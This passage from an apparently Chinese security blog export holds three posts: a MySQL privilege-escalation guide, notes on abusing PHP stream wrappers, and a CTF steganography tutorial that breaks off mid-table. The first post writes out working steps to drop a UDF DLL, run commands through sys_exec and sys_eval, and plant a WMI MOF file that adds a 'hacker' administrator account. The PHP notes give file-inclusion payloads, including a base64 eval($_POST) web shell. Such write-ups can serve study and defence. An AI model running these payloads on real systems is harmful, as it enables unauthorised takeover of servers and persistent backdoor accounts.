0x4D5A90000300000004000000FFFF0000B80000000000000040000... into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</code>写入，成功提示Query OK, 1 row affected (0.001 sec)，失败查看错误信息。</p></li><li><p>创建一个表并将二进制数据插入到十六进制编码流中，其中的二进制数据用update语句来连接。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);//创建temp表</span><br><span class="line">insert into temp(data) values (0x4D5A90000300000004000000FFFF0000B80000000000000040000000000000...);插入数据</span><br><span class="line">update temp set data=concat(data,0x0000000000000000000000000000000000000000000000000000000000F80000);//循环合并更新，直到全部完成</span><br><span class="line">select data from temp into dumpfile &quot;C:\\phpStudy\PHPTutorial\MySQL\lib\plugin\udf.dll&quot;//写出文件</span><br><span class="line"></span><br><span class="line">//我测试的时候直接全部插入也可以，上面是网上的方法</span><br></pre></td></tr></table></figure><ul><li><p>直接在磁盘上将文件从网络共享加载到第三种方法创建的表中，使用“load data infile”语句在本地加载。像上图所示将文件转换为十六进制，并在写入磁盘时取消编辑。<br><img src="https://img.xpctf.cn/img/20200723084314.png"></p></li><li><p>使用MySQL 5.6.1和MariaDB 10.0.5中介绍的函数“to_base64”和“from_base64”上传二进制文件。<br><code>select to_base64(load_file(&#39;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll&#39;)) into dumpfile &quot;/tmp/udf32_win.b64&quot;;</code><br>使用from_base64解密写入到pugin文件夹。<br><img src="https://img.xpctf.cn/img/20200723085436.png"><br>之后就可以像下面这样将整个文件传递给mysql。(网上般的，我不懂)<br><img src="https://img.xpctf.cn/img/20200723085622.png"></p></li><li><p>使用上面讨论的“load data infile”语句，直接从网络共享或本地编写base64编码文件，并像下面这样dump。(这个也是网上的方法，应该可以结合文件上传)<br><img src="https://img.xpctf.cn/img/20200723085657.png"></p></li></ul><h3 id="正式提权"><a href="#正式提权" class="headerlink" title="正式提权"></a>正式提权</h3><ul><li><p>安装sys_exec函数<br>执行安装命令：create function sys_exec returns int soname ‘udf32.dll’;<br>报错：Can’t open shared library ‘udf.dll’ (errno: 193 )<br>万能得度娘没给我答案，然后我放了一个32位的进去就成功了。</p></li><li><p>验证sys_exec函数<br>执行查询命令验证：select * from mysql.func;</p></li><li><p>实际使用<br>我研究了半天这个函数原来返回值是int，经过测试发现成功返回0，命令执行失败返回1；还可以执行ping看延迟来判断命令有没有被执行。<br><img src="https://img.xpctf.cn/img/20200722211918.png"></p></li></ul><h3 id="更好的姿势"><a href="#更好的姿势" class="headerlink" title="更好的姿势"></a>更好的姿势</h3><p>经过度娘学习发现udf.dll里面有一个能回显命令的函数：sys_eval (想不想php的eval，手动滑稽)，<br>安装sys_eval函数：<code>create function sys_eval returns string soname &#39;udf32.dll&#39;;</code><br>验证是否安装成功：<code>select * from mysql.func;</code><br><img src="https://img.xpctf.cn/img/20200722212544.png"><br>测试命令：<code>select sys_eval(&#39;net user&#39;);</code><br><img src="https://img.xpctf.cn/img/20200722212704.png"><br>使用<code>select sys_eval(&#39;net user hacker /add&#39;);</code>创建一个用户。</p><h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><p>命令：<code>drop function sys_exec;</code></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>MySQL UDF提权执行系统命令：<a href="https://blog.csdn.net/qq_36119192/article/details/84863268#UDF%E6%8F%90%E6%9D%83">https://blog.csdn.net/qq_36119192/article/details/84863268#UDF%E6%8F%90%E6%9D%83</a><br>详解MySQL UDF执行命令：<a href="http://www.360doc.com/content/18/0228/22/31784658_733287732.shtml">http://www.360doc.com/content/18/0228/22/31784658_733287732.shtml</a></p><h2 id="Mof提权"><a href="#Mof提权" class="headerlink" title="Mof提权"></a>Mof提权</h2><p>什么是Mof提权？<br>在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次（由”And TargetInstance.Second &#x3D; 5”;控制，这里输入5就是每分钟的第五秒执行。一会mof文件我会分享的。），那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。<br>Mof只能在Windows平台使用，但不止数据库可以使用，理论上只要对c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;有读取权限都可以使用。</p><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><p>secure_file_priv&#x3D;空白 不限制导入导出<br>数据库用户对c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;有读取权限</p><h3 id="mof文件"><a href="#mof文件" class="headerlink" title="mof文件"></a>mof文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">    &quot;var WSH = new (\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>先修改好保存到本地，以.mof命名即可，更改net.exe user admin admin &#x2F;add来修改创建的用户。<br>然后使用文件上传把user.mof文件上传，使用浏览器访问<a href="http://172.19.4.7/DVWA/hackable/uploads/user.mof">http://172.19.4.7/DVWA/hackable/uploads/user.mof</a> 如果访问成功即上传成功。<br><img src="https://img.xpctf.cn/img/20200723145303.png"></p><h3 id="MySQL重写"><a href="#MySQL重写" class="headerlink" title="MySQL重写"></a>MySQL重写</h3><p>使用MySQL把mof文件重新写到C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下，也可以说是移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/phpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/user.mof&quot;) into dumpfile &quot;C:/phpStudy/PHPTutorial/MySQL/lib/plugin/nullevt.mof&quot;;</span><br></pre></td></tr></table></figure><p>我试了2003和2008都是ERROR 1 (HY000): Can’t create&#x2F;write to file ‘C:\WINDOWS\system32\wbem\mof\nullevt.mof’ (Errcode: 2)，我手动放一个mof到mof目录下试试效果，以后找到问题再来补充。<br>有的时候会失败，执行完后nullevt.mof文件会被删除，执行命令后成功创建用户。<br><img src="https://img.xpctf.cn/img/20200723160120.png"></p><h3 id="提权mof"><a href="#提权mof" class="headerlink" title="提权mof"></a>提权mof</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/posts/192b/"/>
      <url>/posts/192b/</url>
      
        <content type="html"><![CDATA[<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>PHP function allow_url_include&#x3D;On<br>PHP function allow_url_fopen&#x3D;On</p><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流；官方的解释我也看不懂，我就知道POST提交php代码会被执行，不需要键名，直接提交代码。<br><img src="https://img.xpctf.cn/img/20200721162913.png"></p><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。<br>在CTF中一般和文件包含一起利用，通常被利用来读取源码，直接读取会帮当成php代码执行，可以使用base64把读取到的内容编码，解密后即可得到源码。<code>php://filter/read=convert.base64-encode/resource=0e.php</code></p><h2 id="zlib-x2F-x2F"><a href="#zlib-x2F-x2F" class="headerlink" title="zlib:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;</h2><p>该协议是压缩流，说白了就是php中读取压缩文件，虽然是读取压缩流，但也可以读取未压缩的文件，allow_url_include和allow_url_fopen都为off可以正常使用。我测试相对和绝对路径都可以，php版本5.4.45。用法a&#x3D;compress.zlib:&#x2F;&#x2F;0e.php.gz</p><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>payload：<code>http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23code.txt</code><br>也是读取压缩流，但是得绝对路径(淦)，先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。<br>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p><h2 id="bzip2-x2F-x2F"><a href="#bzip2-x2F-x2F" class="headerlink" title="bzip2:&#x2F;&#x2F;"></a>bzip2:&#x2F;&#x2F;</h2><p>读取压缩流协议，和前俩个一样。用法：a&#x3D;compress.bzip2:&#x2F;&#x2F;file.bz2</p><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<code>page=data://text/palin,&lt;?php phpinfo(); ?&gt;</code><br>如果过滤了特殊符号，可以使用base64编码：<code>page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code></p><p>还可以这样写：<code>data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=</code></p><h2 id="别人有的我也得有"><a href="#别人有的我也得有" class="headerlink" title="别人有的我也得有"></a>别人有的我也得有</h2><p><img src="https://img.xpctf.cn/img/20200722101954.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项</title>
      <link href="/posts/74ff/"/>
      <url>/posts/74ff/</url>
      
        <content type="html"><![CDATA[<h2 id="一、misc中隐写概述和工具介绍"><a href="#一、misc中隐写概述和工具介绍" class="headerlink" title="一、misc中隐写概述和工具介绍"></a>一、misc中隐写概述和工具介绍</h2><h3 id="1-隐写术"><a href="#1-隐写术" class="headerlink" title="1. 隐写术"></a>1. 隐写术</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;隐写术是一本关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。隐写术的英文名叫做Steganography，来源于特里特米乌斯的一本讲述密码学与隐写术的著作steganographia，该书书名源于希腊语，意为”隐秘书写”。</p><h3 id="2-题目类型"><a href="#2-题目类型" class="headerlink" title="2. 题目类型"></a>2. 题目类型</h3><p>隐写术题目在CTF中大致分为以下几种类型：<br>图片隐写—-jpg、png、bmp等图片的信息隐藏<br>音频隐写—-MP3隐写、波形隐写、频谱隐写<br>文档隐写—-常见文档格式，如doc、word、pdf等文件的信息隐藏<br>视频隐写—-在嵌入视频中嵌入隐藏信息<br>其他隐写—-如NTFS流、HTML的snow隐写等</p><h3 id="3-文件头"><a href="#3-文件头" class="headerlink" title="3. 文件头"></a>3. 文件头</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;在隐写题目中，首先要介绍的知识点是文件头，文件头是位于文件开头的一段承担一定任务的数据。一般都在文件开头的部分，文件头一般是系统文件类似的重要标准，尤其是当我们遇到需要修复文件的题目时，更加需要掌握常见文件的头部和尾部标识。<br><img src="https://img.xpctf.cn/img/20200708113059.png"></p><h3 id="4-十六进制编辑器"><a href="#4-十六进制编辑器" class="headerlink" title="4. 十六进制编辑器"></a>4. 十六进制编辑器</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;十六进制编辑器，用来以16进制视图进行文本编辑的编辑工具软件。十六进制编辑器可以用来检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等，如010 Editor、Winhex等都是功能比较强大的十六进制编译器，推荐使用010 Editor，内置很多模板，分析比较方便。<br><img src="https://img.xpctf.cn/img/20200708142921.png"></p><h3 id="5-file命令"><a href="#5-file命令" class="headerlink" title="5. file命令"></a>5. file命令</h3><p>Linux系统自带工具，用来快速查看文件类型，通过file指令，我们得以辨识该文件的类型。<br>file识别文件类型命令：file 文件名</p><h3 id="6-binwalk工具"><a href="#6-binwalk工具" class="headerlink" title="6. binwalk工具"></a>6. binwalk工具</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;binwalk是一个自动提取文件系统，该工具最大的优点就是自动完成指定文件的扫描，只能发掘潜藏在文件中所有可疑的文件类型及文件系统。相比file命令行工具来说，file只能从文件的第一个字节来开始识别，且只能把一个文件识别成一个类型的文件，很难看出来是否隐藏着其他文件，binwalk就能很好的完成这项任务。<br>binwalk识别隐藏文件命令：binwalk 文件名<br>binwalk提取隐藏文件命令：binwalk -e 文件名</p><h3 id="7-foremost工具"><a href="#7-foremost工具" class="headerlink" title="7. foremost工具"></a>7. foremost工具</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;foremost是基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。该工具通过分析不同类型文件的头、尾、内部数据结构，同镜像文件的数据进行对比，以还原文件。他默认支持19种类型的文件恢复。用户还可以通过修改配置文件扩展支持其他文件类型，有时候binwalk无法正确分离出文件时，可以尝试使用foremost工具分离。<br>foremost分离常用命令：foremost 文件名 -o 文件夹名</p><h3 id="8-dd手动分离工具"><a href="#8-dd手动分离工具" class="headerlink" title="8. dd手动分离工具"></a>8. dd手动分离工具</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;前面两种都是自动化分离工具，dd这个工具是一种半自动化工具，有时候自动化工具不能实现文件分离，所以需要用这个工具来进行分离。<br>分离常用命令：dd if&#x3D;源文件 bs&#x3D;1 skip&#x3D;开始分离的字节数 of&#x3D;目标文件名</p><h3 id="9-stegsolve工具"><a href="#9-stegsolve工具" class="headerlink" title="9. stegsolve工具"></a>9. stegsolve工具</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;这是一款使用java开发的工具，在CTF中最常用来检测LSB隐写痕迹的工具是stegsolve，这是一款可以对图片进行多种操作的工具，包括对图片进行xor，sub等操作，对图片不同通道进行查看等功能。<br>File Format：文件格式，这个主要是查看图片的具体信息<br>Fata Extract：数据抽取，图片中隐藏数据的抽取<br>Frame Browser：帧浏览器，主要是对GIF之类的动图进行分解<br>Image Combiner：拼图，图片拼接</p><h3 id="10-stegdetect工具"><a href="#10-stegdetect工具" class="headerlink" title="10. stegdetect工具"></a>10. stegdetect工具</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;stegdetect程序主要用于分析jpeg文件，可以检测到通过JSteg、JPHide、OutGuess、invisible secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，stegdetect通过统计检测来分析图像文件中是否包括隐藏内容。他运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别隐藏内容是通过哪个工具嵌入的。<br>GitHub地址：<a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a><br>常用命令：stegdetect -s 10 文件名</p><h2 id="二、JPG图片隐写"><a href="#二、JPG图片隐写" class="headerlink" title="二、JPG图片隐写"></a>二、JPG图片隐写</h2><h3 id="1-工具下载"><a href="#1-工具下载" class="headerlink" title="1. 工具下载"></a>1. 工具下载</h3><p><strong>Windows平台：</strong><br>jphs：<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip">http://io.acad.athabascau.ca/~grizzlie&#x2F;Comp607&#x2F;jphs05.zip</a><br>Steghide：<a href="http://steghide.sourceforge.net/download.php">http://steghide.sourceforge.net/download.php</a><br>silenteye：<a href="https://sourceforge.net/projects/silenteye/">https://sourceforge.net/projects/silenteye/</a><br>JPEGsnoop：<a href="https://www.impulseadventure.com/photo/jpeg-snoop.html">https://www.impulseadventure.com/photo/jpeg-snoop.html</a></p><p><strong>Linux平台：</strong><br>outguess：<a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a><br>F5：<a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a><br>steghide：<a href="https://github.com/StefanoDeVuono/steghide">https://github.com/StefanoDeVuono/steghide</a></p><h3 id="2-JPG文件结构"><a href="#2-JPG文件结构" class="headerlink" title="2. JPG文件结构"></a>2. JPG文件结构</h3><p>JPG以一副24位彩色图像为例，JPEG的压缩分为四个步骤：<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;颜色转换：在将彩色图像进行压缩之前，必须先对颜色模式进行数据转换，转换完成之后还需要进行数据采样。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;DCT变换：是将图像信号在频率域上进行变换，分离出高频和低频信息的处理过程，然后再对图像的高频部分(即图像细节)进行压缩。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;量化：由于下面的第四步编码过程中使用的码本都是整数，对此要对频率系数进行量化，将之转换为整数。数据量化后，矩阵中的数据都是近似值，和原始图像数据之间有了差异，这一差异是造成图像压缩后失真的主要原因。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;编码：编码是基于统计特性的方式。<br><img src="https://img.xpctf.cn/img/20200710113647.png"></p><h3 id="3-JPG常见隐写方式"><a href="#3-JPG常见隐写方式" class="headerlink" title="3.  JPG常见隐写方式"></a>3.  JPG常见隐写方式</h3><ul><li>Exif信息隐藏<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;Exif是可交换图像文件格式，是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。hpg图片拥有exif信息，可以用来通过填充exif信息来隐藏信息。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;解决方法：<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在Windows平台右键图片点击属性，可以查看部分exif信息。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在Linux平台可使用exiftool工具查看所有的exif信息。</li><li>字符附加<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;在附加式的图片隐写术中，我们通常是用某种程序或者某种方法在载体文件中直接附加上需要被隐写的字符串或者其他信息，由于写入的位置对图片来说无关紧要，所以不会影响图片的正常打开识别。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;解决方式：<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;用16进制编辑器打开图片，查找与flag有关的字符，出现在文件末尾的可能性最大<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在linux下，使用strings命令，可以将文件中的所有字符串打印出来，steings命令在对对象文件或者二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意系列，以换行符或空字符结束。strings命令对识别随机对象很有用。</li><li>文件结合<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;采用一种特殊方式将图片文件与其他文件结合起来。该文件一般保存为jpg格式，可以正常显示图片，当有人获取该图片后，可以修改文件的后缀名，比如结合的是zip文件，将图片改为zip压缩文件，在文件无损坏的情况下就可以以zip文件直接打开。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;图种是一种以图片文件为载体，然后将zip等压缩文附加在图片文件后面。因为操作系统识别的过程是从文件头标志，到文件的结束标志位，当系统识别到图片的结束标志位后，默认是不再继续识别的，所以我们在通常情况下只能看到它是一张图片。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;解决方式：<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在Windows平台下修改后缀名或者16进制编辑器手动分离<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在Linux平台下使用binwalk，dd,foremost等工具分离</li><li>基于DCT域的JPG图像隐写<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;因为DCT是一种有损压缩技术，但一般不会影响图像的视觉效果，可以通过这个特性来隐藏信息。在这个隐写类型中，常见的隐写方法有JSteg、JPHide、Outguess、F5等。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;解决方法：<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;使用Stegdetect工具检测隐写方式，并且还可以基于字典暴力破解密码方式提取通过JPHide、outguess等方式嵌入的隐藏信息。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;&amp;#160; &amp;#160; &amp;#160; &amp;#160;根据Stegdetect的判断结果，使用对应工具玩完成解密。</li><li>SilentEye工具隐写<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;使用SilentEye进行信息隐藏，SlientEye是一款免费的图片信息隐藏工具，可以对图片和音频进行信息隐藏。</li></ul><h3 id="4-JPG隐写实战"><a href="#4-JPG隐写实战" class="headerlink" title="4. JPG隐写实战"></a>4. JPG隐写实战</h3><h4 id="4-1-Exif隐写"><a href="#4-1-Exif隐写" class="headerlink" title="4.1 Exif隐写"></a>4.1 Exif隐写</h4><p>Windows下右键属性选择详细信息选项卡即可查看<br><img src="https://img.xpctf.cn/img/20200711092633.png"><br>linux下使用exiftool工具查询，命令：exiftool 文件名<br><img src="https://img.xpctf.cn/img/20200711092922.png"></p><h4 id="4-2-字符拼接"><a href="#4-2-字符拼接" class="headerlink" title="4.2 字符拼接"></a>4.2 字符拼接</h4><p>Windows下使用16进制编辑器搜索关键字，一般出现在文件尾<br><img src="https://img.xpctf.cn/img/20200711093151.png"><br>Linux下使用strings工具配合grep过滤关键字<br><img src="https://img.xpctf.cn/img/20200711094030.png"></p><h4 id="4-3-文件结合"><a href="#4-3-文件结合" class="headerlink" title="4.3 文件结合"></a>4.3 文件结合</h4><p>Windows下可以使用16进制编辑器搜索该文件文件尾<br><img src="https://img.xpctf.cn/img/20200711094332.png"><br>Linux下使用binwalk -e来分离文件<br><img src="https://img.xpctf.cn/img/20200711095219.png"><br>在Linux下还可以使用foremost来分离<br><img src="https://img.xpctf.cn/img/20200711095330.png"></p><h4 id="4-4-JPHide"><a href="#4-4-JPHide" class="headerlink" title="4.4 JPHide"></a>4.4 JPHide</h4><p>使用stegdetect工具检测隐写方式，命令： .&#x2F;stegdetect -s 10.0 文件名<br><img src="https://img.xpctf.cn/img/20200712193816.png"><br>使用JPHide工具进行解密，open jpeg&#x3D;&gt;Seek&#x3D;&gt;输入密码&#x3D;&gt;保存解密文本</p><h4 id="4-5-outguess"><a href="#4-5-outguess" class="headerlink" title="4.5 outguess"></a>4.5 outguess</h4><p>同样的使用stegdetect工具进行检测，也可以直接全部工具试一遍<br><img src="https://img.xpctf.cn/img/20200712195856.png"><br>使用stegdetect工具检测出是jphide隐写，但使用jphide工具无法解密，此时考虑更换工具<br><img src="https://img.xpctf.cn/img/20200712200229.png"><br>命令： .&#x2F;outguess -k 密码 -r 隐写文件名 解密文件名</p><h4 id="4-6-F5"><a href="#4-6-F5" class="headerlink" title="4.6 F5"></a>4.6 F5</h4><p>F5也是属于DCT域的隐写，掌握F5加密和解密方式即可<br>加密：java Embed 隐写前图片 隐写后图片 -e 隐写文件 -p 密码<br>解密：java Extract 被隐写图片 -p 密码 &#x2F;&#x2F;解密后文件：output.txt</p><h4 id="4-7-steghide"><a href="#4-7-steghide" class="headerlink" title="4.7 steghide"></a>4.7 steghide</h4><p>steghide隐写不止可以隐写jpg，还可以隐写png等格式，掌握使用方法<br>加密：steghide embed -cf 隐写图片-ef 隐写文件 -p 密码<br>解密：steghide.exe extract -sf 被隐写图片 -p 密码</p><h4 id="4-8-slienteye"><a href="#4-8-slienteye" class="headerlink" title="4.8 slienteye"></a>4.8 slienteye</h4><p>拖入图片打开后点击decode即可解密，加密使用encode<br><img src="https://img.xpctf.cn/img/20200713083417.png"></p><h2 id="三、PNG图片隐写"><a href="#三、PNG图片隐写" class="headerlink" title="三、PNG图片隐写"></a>三、PNG图片隐写</h2><h3 id="1-工具下载-1"><a href="#1-工具下载-1" class="headerlink" title="1. 工具下载"></a>1. 工具下载</h3><p>PCRT：<a href="https://github.com/sherlly/PCRT">https://github.com/sherlly/PCRT</a><br>BlindWaterMark：<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a><br>macromedia fireworks 8<br>BCompare</p><h3 id="2-PNG文件格式"><a href="#2-PNG文件格式" class="headerlink" title="2. PNG文件格式"></a>2. PNG文件格式</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;PNG是一种采用无损压缩算法的位图格式，其设计目的是试图替代GIF和TIFF文件格式，同时增加一些GIF文件格式所不具备的特性。PNG图像格式文件（或者称为数据流）由一个8字节的PNG文件署名（PNG file signature）域和按照特定结构组织的3个以上的数据块（chunk）组成。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160;PNG定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是必需的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。</p><table><thead><tr><th align="center">数据块名称</th><th align="center">允许多个数据块</th><th align="center">位置</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">IHDR</td><td align="center">不允许</td><td align="center">第一个数据块</td><td align="center">文件头数据块</td></tr><tr><td 